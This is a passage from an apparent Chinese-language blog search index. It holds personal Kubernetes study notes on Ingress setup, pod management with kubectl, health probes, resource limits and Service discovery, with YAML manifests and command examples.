https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v0.44.0/deploy/static/provider/baremetal/deploy.yaml</span><br><span class=\"line\"><span class=\"comment\"># 原作yaml 無法建立</span></span><br><span class=\"line\"><span class=\"comment\"># error: error validating \"https://raw.githubusercontent.com/zxcvbnius/k8s-30-day-sharing/master/Day19/demo-ingress/nginx-ingress.yaml\": error validating data: [ValidationError(Ingress.metadata): unknown field \"kubernetes.io/ingress.class\" in io.k8s.apimachinery.pkg.apis.meta.v1.ObjectMeta, ValidationError(Ingress.spec.rules[0]): unknown field \"paths\" in io.k8s.api.extensions.v1beta1.IngressRule]; if you choose to ignore these errors, turn validation off with --validate=false</span></span><br><span class=\"line\">vim nginx-ingress.yaml</span><br></pre></td></tr></table></figure>\n<p>參考 <a href=\"https://github.com/zxcvbnius/k8s-30-day-sharing/blob/master/Day19/demo-ingress/ingress-example-2.yaml\" target=\"_blank\" rel=\"noopener\">k8s-30-day-sharing/ingress-example-2.yaml at master · zxcvbnius/k8s-30-day-sharing</a><br>裡面 service name 有錯誤，建議使用下面複製<br><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">extensions/v1beta1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Ingress</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">example-2</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  rules:</span></span><br><span class=\"line\"><span class=\"attr\">  - host:</span> <span class=\"string\">helloworld-v1.example.com</span></span><br><span class=\"line\"><span class=\"attr\">    http:</span></span><br><span class=\"line\"><span class=\"attr\">      paths:</span></span><br><span class=\"line\"><span class=\"attr\">      - path:</span> <span class=\"string\">/</span></span><br><span class=\"line\"><span class=\"attr\">        backend:</span> </span><br><span class=\"line\"><span class=\"attr\">          serviceName:</span> <span class=\"string\">helloworld-v1</span></span><br><span class=\"line\"><span class=\"attr\">          servicePort:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"attr\">  - host:</span> <span class=\"string\">helloworld-v2.example.com</span></span><br><span class=\"line\"><span class=\"attr\">    http:</span></span><br><span class=\"line\"><span class=\"attr\">      paths:</span></span><br><span class=\"line\"><span class=\"attr\">      - path:</span> <span class=\"string\">/</span></span><br><span class=\"line\"><span class=\"attr\">        backend:</span></span><br><span class=\"line\"><span class=\"attr\">          serviceName:</span> <span class=\"string\">helloworld-v2</span></span><br><span class=\"line\"><span class=\"attr\">          servicePort:</span> <span class=\"number\">80</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"測試-host-方法\"><a href=\"#測試-host-方法\" class=\"headerlink\" title=\"測試 host 方法\"></a>測試 host 方法</h3><ol>\n<li>curl -H<br>之前<a href=\"https://malagege.github.io/blog/2020/10/13/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/#%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95\">在 Raspberry PI 架設 Traefik 初體驗 | 程式狂想筆記</a>這篇有紀錄<br>通常改 /etc/hosts 檔案或者curl 指令可以做到(這當初看到 traefik 官方文件寫的，還滿神奇的，畢竟很多教學沒這樣教)</li>\n</ol>\n<ol start=\"2\">\n<li>/etc/hosts</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 這個 IP 是 node IP</span></span><br><span class=\"line\">curl -H Host:helloworld-v1.example.com http://192.168.99.102/  </span><br><span class=\"line\">curl -H Host:helloworld-v2.example.com http://192.168.99.102/</span><br></pre></td></tr></table></figure>\n<h2 id=\"SSL-termination-代理端做-tls\"><a href=\"#SSL-termination-代理端做-tls\" class=\"headerlink\" title=\"SSL termination(代理端做 tls)\"></a>SSL termination(代理端做 tls)</h2><p>ingress-ssl-sceret.yaml<br><figure class=\"highlight yaml\"><figcaption><span>ingress-ssl-sceret.yaml</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">data:</span></span><br><span class=\"line\">  <span class=\"string\">tls.crt:</span> <span class=\"string\">YmFzZTY0X2VuY29kZWRfY2VydA==</span></span><br><span class=\"line\">  <span class=\"string\">tls.key:</span> <span class=\"string\">YmFzZTY0X2VuY29kZWRfa2V5</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Secret</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">ssh-secret</span></span><br><span class=\"line\"><span class=\"attr\">  namespace:</span> <span class=\"string\">default</span></span><br><span class=\"line\"><span class=\"attr\">type:</span> <span class=\"string\">Opaque</span></span><br></pre></td></tr></table></figure></p>\n<p>example3-ingress.yaml<br><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">extensions/v1beta1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Ingress</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">example-3</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  tls:</span></span><br><span class=\"line\"><span class=\"attr\">  - secretName:</span> <span class=\"string\">ssh-secret</span></span><br><span class=\"line\"><span class=\"attr\">  backend:</span></span><br><span class=\"line\"><span class=\"attr\">    serviceName:</span> <span class=\"string\">helloworld-v1</span></span><br><span class=\"line\"><span class=\"attr\">    servicePort:</span> <span class=\"number\">3000</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"運行多個-Ingress-Controller\"><a href=\"#運行多個-Ingress-Controller\" class=\"headerlink\" title=\"運行多個 Ingress Controller\"></a>運行多個 Ingress Controller</h2><p>一個叢集中運行多個Ingress 控制器，可以搭配 Annotation 的 <code>kubernetes.io/ingress.class</code><br>如果沒有配置 <code>kubernetes.io/ingress.class</code>，會有多個不同Ingress Controller 搶 Ingress 使用權，並寫入Ingress 件的status 欄位</p>\n<p>後面兩個就不先仔細研究</p>\n<h2 id=\"wildcard-host\"><a href=\"#wildcard-host\" class=\"headerlink\" title=\"wildcard host\"></a>wildcard host</h2><p><a href=\"https://kubernetes.io/docs/concepts/services-networking/ingress/#hostname-wildcards\" target=\"_blank\" rel=\"noopener\">Ingress | Kubernetes</a></p>\n<h2 id=\"rewrite-url\"><a href=\"#rewrite-url\" class=\"headerlink\" title=\"rewrite url\"></a>rewrite url</h2><p><a href=\"https://www.qikqiak.com/post/url-rewrite-on-ingress-nginx/\" target=\"_blank\" rel=\"noopener\">ingress-nginx 中 Rewrite 的使用-阳明的博客|Kubernetes|Istio|Prometheus|Python|Golang|云原生</a></p>\n<h2 id=\"感想\"><a href=\"#感想\" class=\"headerlink\" title=\"感想\"></a>感想</h2><p>之前有操作 Traefik 使用 Docker Label 讓 Traefik 可以自動抓到想要的 host<br>使用 Ingress 來看，這個設計能做到模組化分離，可算非常棒!!</p>\n<p>以後有用到 Traefik  Ingress 再回來填坑</p>\n","categories":["Kubernetes"],"tags":["Kubernetes","ingress"]},{"title":"Kubernetes 操作 Pod 小記","url":"/blog/2021/01/19/Kubernetes-%E6%93%8D%E4%BD%9C-Pod-%E5%B0%8F%E8%A8%98/","content":"<p>記錄</p>\n<a id=\"more\"></a>\n<p>使用前建議使用<a href=\"https://kubernetes.io/docs/tasks/tools/install-kubectl/#enabling-shell-autocompletion\" target=\"_blank\" rel=\"noopener\">Install and Set Up kubectl | Kubernetes</a><br>方便操作指令使用</p>\n<h2 id=\"建立-Pod\"><a href=\"#建立-Pod\" class=\"headerlink\" title=\"建立 Pod\"></a>建立 Pod</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl run kuard --generator=run-pod/v1 --image=gcr.io/kuar-demo/kuard-amd64:blue</span><br><span class=\"line\"><span class=\"comment\"># Flag --generator has been deprecated, has no effect and will be removed in the future.</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.voidking.com/dev-kubectl/\" target=\"_blank\" rel=\"noopener\">kubectl常用命令 | 好好学习的郝</a><br><a href=\"https://blog.csdn.net/CANGYE0504/article/details/106179563\" target=\"_blank\" rel=\"noopener\">kubectl –generator 参数被弃用问题解决_沧夜-CSDN博客</a><br><a href=\"https://kubernetes.io/zh/docs/reference/kubectl/conventions/#kubectl-run\" target=\"_blank\" rel=\"noopener\">kubectl 的用法约定 | Kubernetes</a></p>\n<p>啟動完會看到 pods 有成功</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl get pods</span><br><span class=\"line\"><span class=\"comment\"># NAME    READY   STATUS    RESTARTS   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># kuard   1/1     Running   0          12s</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"運行-Pod\"><a href=\"#運行-Pod\" class=\"headerlink\" title=\"運行 Pod\"></a>運行 Pod</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f kuard-pod.yaml</span><br></pre></td></tr></table></figure>\n<h2 id=\"移除-Pod\"><a href=\"#移除-Pod\" class=\"headerlink\" title=\"移除 Pod\"></a>移除 Pod</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 使用</span></span><br><span class=\"line\">kubectl delete pods kuard</span><br><span class=\"line\"><span class=\"comment\"># 刪除 pods</span></span><br><span class=\"line\">kubectl delete -f kuard-pod.yaml</span><br></pre></td></tr></table></figure>\n<h2 id=\"轉發-port\"><a href=\"#轉發-port\" class=\"headerlink\" title=\"轉發 port\"></a>轉發 port</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 本地轉發</span></span><br><span class=\"line\">kubectl port-forward kuard 8080:8080    </span><br><span class=\"line\"><span class=\"comment\"># Forwarding from 127.0.0.1:8080 -&gt; 8080</span></span><br><span class=\"line\"><span class=\"comment\"># Forwarding from [::1]:8080 -&gt; 8080</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 對外來原 IP 轉發</span></span><br><span class=\"line\">kubectl port-forward kuard 8080:8080 --address 0.0.0.0 </span><br><span class=\"line\"><span class=\"comment\"># Forwarding from 0.0.0.0:8080 -&gt; 8080</span></span><br></pre></td></tr></table></figure>\n<p>更多可參考<a href=\"https://phoenixnap.com/kb/kubectl-port-forward\" target=\"_blank\" rel=\"noopener\">kubectl Port-Forward - Kubernetes Port Forwarding Guide</a></p>\n<p>http://<code>IP</code>:8080<br>就能訪問環境頁面</p>\n<h2 id=\"查看-log\"><a href=\"#查看-log\" class=\"headerlink\" title=\"查看 log\"></a>查看 log</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl logs kuard</span><br></pre></td></tr></table></figure>\n<h2 id=\"exec-執行程式\"><a href=\"#exec-執行程式\" class=\"headerlink\" title=\"exec 執行程式\"></a>exec 執行程式</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl exec kuard ifconfig</span><br><span class=\"line\">kubectl exec kuard ip a</span><br></pre></td></tr></table></figure>\n<p>跟 docker 操作方式差不多</p>\n<p>我注意到<code>kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl <span class=\"built_in\">exec</span> kuard -- ls -l</span><br></pre></td></tr></table></figure>\n<h2 id=\"容器複製檔案\"><a href=\"#容器複製檔案\" class=\"headerlink\" title=\"容器複製檔案\"></a>容器複製檔案</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl cp  &lt;file-spec-src&gt; &lt;file-spec-dest&gt;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#cp\" target=\"_blank\" rel=\"noopener\">Kubectl Reference Docs</a></p>\n<p>使用中有看到錯誤</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl cp kuard:/kuard ./kuard                                                                             ✔  26  23:09:09 </span><br><span class=\"line\"><span class=\"comment\"># tar: removing leading '/' from member names</span></span><br><span class=\"line\">ls</span><br><span class=\"line\"><span class=\"comment\"># kuard</span></span><br></pre></td></tr></table></figure>\n<p>有看到tar錯誤，後來 ls 有看到檔案<br><a href=\"https://cloud.tencent.com/developer/article/1632562\" target=\"_blank\" rel=\"noopener\">修復kubectl cp出現tar: Removing leading `/‘ from member names - 雲+社區 - 騰訊雲</a><br><a href=\"https://github.com/kubernetes/kubernetes/issues/58692\" target=\"_blank\" rel=\"noopener\">Kubectl cp gives “tar: removing leading ‘/‘ from member names” warning · Issue #58692 · kubernetes/kubernetes</a><br>原來是 bug …</p>\n<h2 id=\"健康檢查\"><a href=\"#健康檢查\" class=\"headerlink\" title=\"健康檢查\"></a>健康檢查</h2><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  labels:</span></span><br><span class=\"line\"><span class=\"attr\">    test:</span> <span class=\"string\">liveness</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">liveness-exec</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  containers:</span></span><br><span class=\"line\"><span class=\"attr\">  - name:</span> <span class=\"string\">liveness</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">k8s.gcr.io/busybox</span></span><br><span class=\"line\"><span class=\"attr\">    args:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">/bin/sh</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"bullet\">-c</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">touch</span> <span class=\"string\">/tmp/healthy;</span> <span class=\"string\">sleep</span> <span class=\"number\">30</span><span class=\"string\">;</span> <span class=\"string\">rm</span> <span class=\"bullet\">-rf</span> <span class=\"string\">/tmp/healthy;</span> <span class=\"string\">sleep</span> <span class=\"number\">600</span></span><br><span class=\"line\"><span class=\"attr\">    livenessProbe:</span></span><br><span class=\"line\"><span class=\"attr\">      exec:</span></span><br><span class=\"line\"><span class=\"attr\">        command:</span></span><br><span class=\"line\"><span class=\"bullet\">        -</span> <span class=\"string\">cat</span></span><br><span class=\"line\"><span class=\"bullet\">        -</span> <span class=\"string\">/tmp/healthy</span></span><br><span class=\"line\"><span class=\"attr\">      initialDelaySeconds:</span> <span class=\"number\">5</span>      <span class=\"comment\"># initialDelaySeconds 字段告訴 kubelet 在執行第一次探測前應該等待 5 秒</span></span><br><span class=\"line\"><span class=\"attr\">      periodSeconds:</span> <span class=\"number\">5</span>            <span class=\"comment\"># periodSeconds 字段指定了 kubelet 應該每 5 秒執行一次存活探測</span></span><br></pre></td></tr></table></figure>\n<p>在這個配置文件中，可以看到 Pod 中只有一個容器。<br>periodSeconds 字段指定了 kubelet 應該每 5 秒執行一次存活探測。<br>initialDelaySeconds 字段告訴 kubelet 在執行第一次探測前應該等待 5 秒。<br>kubelet 在容器內執行命令 cat /tmp/healthy 來進行探測。 如果命令執行成功並且返回值為 0，kubelet 就會認為這個容器是健康存活的。 如果這個命令返回非 0 值，kubelet 會殺死這個容器並重新啟動它。</p>\n<p>有兩種 Liveness, Readiness<br>上面是<a href=\"https://kubernetes.io/zh/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/\" target=\"_blank\" rel=\"noopener\">配置存活、就绪和启动探测器 | Kubernetes</a>範例</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://k8s.io/examples/pods/probe/exec-liveness.yaml</span><br></pre></td></tr></table></figure>\n<p>liveness,readiness 後面會在做整理</p>\n<blockquote>\n<p>如果使用 Liveness Probe，當錯誤發生時 (無回應或回應錯誤)，k8s 會嘗試重新建立 (kill then create) 一個新的容器。</p>\n</blockquote>\n<blockquote>\n<p>如果使用 Readiness Probe，當錯誤發生時，對應的 Service 物件就會將該容器標示為不可使用，所以任何的需求都不會導向該容器。<br>可先看<a href=\"https://ithelp.ithome.com.tw/articles/10193956\" target=\"_blank\" rel=\"noopener\">Day 24 - 常見問題與建議 (5) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n</blockquote>\n<p>Liveness Probe 啟動時候，web 可能會有延連時間。例如有些程式啟動不可能馬上出現內容<br>這時候 <code>initialDelaySeconds</code> 設定就很重要</p>\n<p>Readiness Prob 啟動時候，Service 會算到 Pod 可用，會把當下 Container IP 加到 Service。<br><a href=\"https://jimmysong.io/kubernetes-handbook/guide/configure-liveness-readiness-probes.html\" target=\"_blank\" rel=\"noopener\">配置 Pod 的 liveness 和 readiness 探針 ‧ Kubernetes Handbook - Kubernetes中文指南/雲原生應用架構實踐手冊 by Jimmy Song(宋淨超)</a></p>\n<h2 id=\"資源限制\"><a href=\"#資源限制\" class=\"headerlink\" title=\"資源限制\"></a>資源限制</h2><h3 id=\"Request-Limit\"><a href=\"#Request-Limit\" class=\"headerlink\" title=\"Request,Limit\"></a>Request,Limit</h3><p><a href=\"https://kubernetes.io/zh/docs/tasks/configure-pod-container/assign-cpu-resource/\" target=\"_blank\" rel=\"noopener\">为容器和 Pods 分配 CPU 资源 | Kubernetes</a></p>\n<p>Minikube需要安裝 metrics-server </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">minikube addons <span class=\"built_in\">enable</span> metrics-server</span><br><span class=\"line\"></span><br><span class=\"line\">kubectl get apiservices</span><br><span class=\"line\"><span class=\"comment\"># NAME</span></span><br><span class=\"line\"><span class=\"comment\"># v1beta1.metrics.k8s.io</span></span><br></pre></td></tr></table></figure>\n<p>創建一個 namespace </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl create namespace cpu-example</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight yaml\"><figcaption><span>https://k8s.io/examples/pods/resource/cpu-request-limit.yaml</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">cpu-demo</span></span><br><span class=\"line\"><span class=\"attr\">  namespace:</span> <span class=\"string\">cpu-example</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  containers:</span></span><br><span class=\"line\"><span class=\"attr\">  - name:</span> <span class=\"string\">cpu-demo-ctr</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">vish/stress</span></span><br><span class=\"line\"><span class=\"attr\">    resources:</span></span><br><span class=\"line\"><span class=\"attr\">      limits:</span></span><br><span class=\"line\"><span class=\"attr\">        cpu:</span> <span class=\"string\">\"1\"</span></span><br><span class=\"line\"><span class=\"attr\">      requests:</span></span><br><span class=\"line\"><span class=\"attr\">        cpu:</span> <span class=\"string\">\"0.5\"</span></span><br><span class=\"line\"><span class=\"attr\">    args:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"bullet\">-cpus</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">\"2\"</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://k8s.io/examples/pods/resource/cpu-request-limit.yaml --namespace=cpu-example</span><br><span class=\"line\"></span><br><span class=\"line\">kubectl get pod cpu-demo --namespace=cpu-example</span><br><span class=\"line\"><span class=\"comment\"># 可以看到 limit 有限制</span></span><br><span class=\"line\"><span class=\"comment\"># 輸出顯示 Pod 中的一個容器的 CPU 請求為 500 milli CPU，並且 CPU 限制為 1 個 CPU。</span></span><br><span class=\"line\"><span class=\"comment\"># resources:</span></span><br><span class=\"line\"><span class=\"comment\">#   limits:</span></span><br><span class=\"line\"><span class=\"comment\">#     cpu: \"1\"</span></span><br><span class=\"line\"><span class=\"comment\">#   requests:</span></span><br><span class=\"line\"><span class=\"comment\">#     cpu: 500m</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">NAME       CPU(cores)   MEMORY(bytes)   </span><br><span class=\"line\">cpu-demo   1006m        2Mi</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl delete namespace cpu-example</span><br></pre></td></tr></table></figure>\n<h2 id=\"Volumes\"><a href=\"#Volumes\" class=\"headerlink\" title=\"Volumes\"></a>Volumes</h2><p><a href=\"https://kubernetes.io/docs/concepts/storage/volumes/\" target=\"_blank\" rel=\"noopener\">Volumes | Kubernetes</a></p>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>相關 YAML API 文件<br><a href=\"https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.20/\" target=\"_blank\" rel=\"noopener\">Kubernetes API Reference Docs</a></p>\n","categories":["Kubernetes"],"tags":["pod"]},{"title":"Kubernetes 服務探索(Service Discovery)","url":"/blog/2021/02/04/Kubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery/","content":"<p>Kubernetes  Service 筆記</p>\n<a id=\"more\"></a>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl run alpaca-prod \\</span><br><span class=\"line\">--image=gcr.io/kuar-demo/kuard-amd64:blue \\</span><br><span class=\"line\">--port=8000 \\</span><br><span class=\"line\">--labels=<span class=\"string\">\"ver=1,app=alpaca,env=prod\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 用 expose 創建一個 service</span></span><br><span class=\"line\">kubectl expose pod alpaca-prod</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 這邊很有趣，看 kubectl describe svc alpaca-prod</span></span><br><span class=\"line\"><span class=\"comment\"># 裡面</span></span><br><span class=\"line\"><span class=\"comment\"># spec:</span></span><br><span class=\"line\"><span class=\"comment\">#   clusterIP: 10.96.29.232</span></span><br><span class=\"line\"><span class=\"comment\">#   ports:</span></span><br><span class=\"line\"><span class=\"comment\">#   - port: 8000</span></span><br><span class=\"line\"><span class=\"comment\">#     protocol: TCP</span></span><br><span class=\"line\"><span class=\"comment\">#     targetPort: 8000</span></span><br><span class=\"line\"><span class=\"comment\">#   selector:</span></span><br><span class=\"line\"><span class=\"comment\">#     app: alpaca</span></span><br><span class=\"line\"><span class=\"comment\">#     env: prod</span></span><br><span class=\"line\"><span class=\"comment\">#     ver: \"1\"</span></span><br><span class=\"line\"><span class=\"comment\">#是用 selector 對印</span></span><br><span class=\"line\"></span><br><span class=\"line\">kubectl get services -o wide</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 現在 kubectl run 產生 pod ，所以應該可以不用這段</span></span><br><span class=\"line\"><span class=\"comment\"># 這段是書寫的，之後改成 deployment 再嘗試</span></span><br><span class=\"line\">ALPACA_POD=$(kubectl get pods -l app=alpaca \\</span><br><span class=\"line\">-o jsonpath=<span class=\"string\">'&#123;.items[0].metadata.name&#125;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># $ALPACA_POD =&gt; alapaca-pod</span></span><br><span class=\"line\">kubectl port-forward <span class=\"variable\">$ALPACA_POD</span> 48858:8080</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 執行完成可以用 localhost:48858 看到頁面</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Cluster-IP\"><a href=\"#Cluster-IP\" class=\"headerlink\" title=\"Cluster IP\"></a>Cluster IP</h2><p>Cluster IP 是虛擬 IP，通常會指定一個 DNS，通常 IP 不會更動，這樣就不會有 DNS 快取問題。<br>在 namespace ，我們只需要用 service 名稱連結 pod</p>\n<h3 id=\"Service-DNS\"><a href=\"#Service-DNS\" class=\"headerlink\" title=\"Service DNS\"></a>Service DNS</h3><p>用剛剛<code>kubectl port-forward $ALPACA_POD 48858:8080</code><br>進去<code>http://localhost:48858/</code>裡面的<code>DNS QUERY</code><br>name 輸入 <code>alpaca-prod</code>就可以找到</p>\n<p><a href=\"https://kubernetes.io/docs/tasks/administer-cluster/dns-debugging-resolution/\" target=\"_blank\" rel=\"noopener\">Debugging DNS Resolution | Kubernetes</a></p>\n<p>alpaca-prod.default.svc.cluster.local</p>\n<p>這邊可以看到 <code>alpaca-prod</code>後面 <code>default</code> 是 namespace<br>可以在 dns 搜尋 alpaca-prod.default 查詢到東西<br>完整的<code>alpaca-prod.default.svc.cluster.local</code><br>也可以查詢到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">;; opcode: QUERY, status: NOERROR, id: 22467</span><br><span class=\"line\">;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class=\"line\"></span><br><span class=\"line\">;; QUESTION SECTION:</span><br><span class=\"line\">;alpaca-prod.default.svc.cluster.local.\tIN\t A</span><br><span class=\"line\"></span><br><span class=\"line\">;; ANSWER SECTION:</span><br><span class=\"line\">alpaca-prod.default.svc.cluster.local.\t30\tIN\tA\t10.99.141.81</span><br></pre></td></tr></table></figure>\n<h3 id=\"Readiness-Prob\"><a href=\"#Readiness-Prob\" class=\"headerlink\" title=\"Readiness Prob\"></a>Readiness Prob</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl  edit deployment/alpaca-prod</span><br></pre></td></tr></table></figure>\n<p>由於這邊使用 pod 會有<code>Forbidden: pod updates may not change fields other than</code></p>\n<blockquote>\n<p>Kubernetes 對 Pod 的更新做了限制，除了更改 Pod 中容器（包括工作容器與初始化容器）的鏡像，以及 activeDeadlineSeconds （對 Job 類型的 Pod 定義失敗重試的最大時間）， tolerations （Pod 對污點的容忍），修改其它部分將不會產生作用，如我們可以嘗試在前面 Pod 定義文檔 pod-test.yaml 中將宿主機端口 8081 改為 8082，重新執行 kubectl apply， 將提示如下錯誤，</p>\n</blockquote>\n<p>參考:<a href=\"https://zhuanlan.zhihu.com/p/234793180\" target=\"_blank\" rel=\"noopener\">Kubernetes筆記（五）：瞭解Pod（容器組） - 知乎</a></p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">...</span></span><br><span class=\"line\"><span class=\"attr\">    livenessProbe:</span></span><br><span class=\"line\"><span class=\"attr\">      httpGet:</span></span><br><span class=\"line\"><span class=\"attr\">        path:</span> <span class=\"string\">/</span></span><br><span class=\"line\"><span class=\"attr\">        port:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"attr\">        httpHeaders:</span> <span class=\"comment\"># 此處header無意義，僅作示例</span></span><br><span class=\"line\"><span class=\"attr\">        - name:</span> <span class=\"string\">purpose</span></span><br><span class=\"line\"><span class=\"attr\">          value:</span> <span class=\"string\">for-test</span></span><br><span class=\"line\"><span class=\"attr\">      initialDelaySeconds:</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"attr\">      periodSeconds:</span> <span class=\"number\">5</span></span><br></pre></td></tr></table></figure>\n<p>這邊就先不仔細研究</p>\n<h3 id=\"用-endpoints-觀察\"><a href=\"#用-endpoints-觀察\" class=\"headerlink\" title=\"用 endpoints 觀察\"></a>用 endpoints 觀察</h3><p>使用 endpint 是尋找 service 將流量發送到何處地方</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl get endpoints alpaca-prod --watch</span><br></pre></td></tr></table></figure>\n<h2 id=\"NodePort\"><a href=\"#NodePort\" class=\"headerlink\" title=\"NodePort\"></a>NodePort</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl edit service alpaca-prod</span><br></pre></td></tr></table></figure>\n<p>TYPE 改成 NodeType<br>這個就跟 docker 設定 port 對外很像</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Name:                     alpaca-prod</span><br><span class=\"line\">Namespace:                default</span><br><span class=\"line\">Labels:                   app=alpaca</span><br><span class=\"line\">                          env=prod</span><br><span class=\"line\">                          ver=1</span><br><span class=\"line\">Annotations:              &lt;none&gt;</span><br><span class=\"line\">Selector:                 app=alpaca,env=prod,ver=1</span><br><span class=\"line\">Type:                     NodePort</span><br><span class=\"line\">IP Families:              &lt;none&gt;</span><br><span class=\"line\">IP:                       10.99.141.81</span><br><span class=\"line\">IPs:                      &lt;none&gt;</span><br><span class=\"line\">Port:                     &lt;unset&gt;  8000/TCP</span><br><span class=\"line\">TargetPort:               8000/TCP</span><br><span class=\"line\">NodePort:                 &lt;unset&gt;  